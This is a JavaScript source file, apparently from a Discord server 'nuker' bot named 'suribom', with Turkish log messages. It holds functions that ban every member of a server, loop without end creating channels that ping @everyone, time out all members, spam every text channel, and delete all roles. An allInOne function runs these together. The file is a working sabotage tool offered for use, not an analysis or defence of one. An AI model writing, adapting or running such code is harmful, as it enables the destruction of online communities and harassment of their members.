// utils/actions.js

let shouldStop = false;

function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function listenStop() {
  process.stdin.resume();
  process.stdin.setEncoding('utf8');
  process.stdin.on('data', function(text) {
    if (text.trim().toLowerCase() === 'stop') {
      shouldStop = true;
      console.log('İşlemler durduruldu!');
    }
  });
}

async function banAll(client, config) {
  const guild = client.guilds.cache.first();
  if (!guild) return console.log("Bot bir sunucuda değil!");
  for (const member of guild.members.cache.values()) {
    if (shouldStop) break;
    if (member.user.bot) continue;
    try {
      await member.ban({ reason: "suribom" });
      console.log(`${member.user.tag} banlandı.`);
    } catch (e) {
      console.log(`${member.user.tag} banlanamadı: ${e.message}`);
    }
    await delay(200); // Daha hızlı
  }
  console.log("Tüm kullanıcılar banlandı!");
}

async function channelSpam(client, config, channelName, msg) {
  const guild = client.guilds.cache.first();
  if (!guild) return console.log("Bot bir sunucuda değil!");
  let i = 0;
  while (guild.available && !shouldStop) {
    try {
      const channel = await guild.channels.create({
        name: channelName + '-' + (i+1),
        type: 0
      });
      let mention = config.disableEveryone ? '' : '@everyone ';
      await channel.send(mention + msg);
      console.log(`${channel.name} açıldı ve everyone etiketlendi.`);
    } catch (e) {
      console.log(`Kanal açılamadı: ${e.message}`);
    }
    await delay(100); // Daha hızlı
    i++;
  }
}

async function muteAll(client, config, msg, rolename) {
  const guild = client.guilds.cache.first();
  if (!guild) return console.log("Bot bir sunucuda değil!");
  // Herkesi sustur
  for (const member of guild.members.cache.values()) {
    if (shouldStop) break;
    if (member.user.bot) continue;
    try {
      await member.timeout(60 * 60 * 1000, 'suribom susturma');
      console.log(`${member.user.tag} susturuldu.`);
    } catch (e) {
      console.log(`${member.user.tag} susturulamadı: ${e.message}`);
    }
    await delay(100);
  }
  // Tüm kanallara mesaj at
  for (const channel of guild.channels.cache.values()) {
    if (shouldStop) break;
    if (channel.isTextBased && channel.permissionsFor(guild.members.me).has('SendMessages')) {
      try {
        let mention = config.disableEveryone ? '' : '@everyone ';
        await channel.send(mention + msg);
        console.log(`${channel.name} kanalına mesaj atıldı.`);
      } catch (e) {
        console.log(`${channel.name} kanalına mesaj atılamadı: ${e.message}`);
      }
      await delay(200);
    }
  }
  // Rolleri sil
  for (const role of guild.roles.cache.values()) {
    if (shouldStop) break;
    if (role.managed || role.name === '@everyone') continue;
    try {
      await role.delete('suribom rol silme');
      console.log(`${role.name} rolü silindi.`);
    } catch (e) {
      console.log(`${role.name} rolü silinemedi: ${e.message}`);
    }
    await delay(100);
  }
  // Yeni rol oluştur
  if (!shouldStop) {
    try {
      await guild.roles.create({ name: rolename, color: 'RANDOM' });
      console.log(`${rolename} isminde yeni rol oluşturuldu.`);
    } catch (e) {
      console.log(`Yeni rol oluşturulamadı: ${e.message}`);
    }
  }
}

async function allInOne(client, config, msg, rolename, channelName) {
  banAll(client, config);
  channelSpam(client, config, channelName, msg);
  muteAll(client, config, msg, rolename);
}

module.exports = { banAll, channelSpam, muteAll, allInOne, delay, listenStop, shouldStop }; 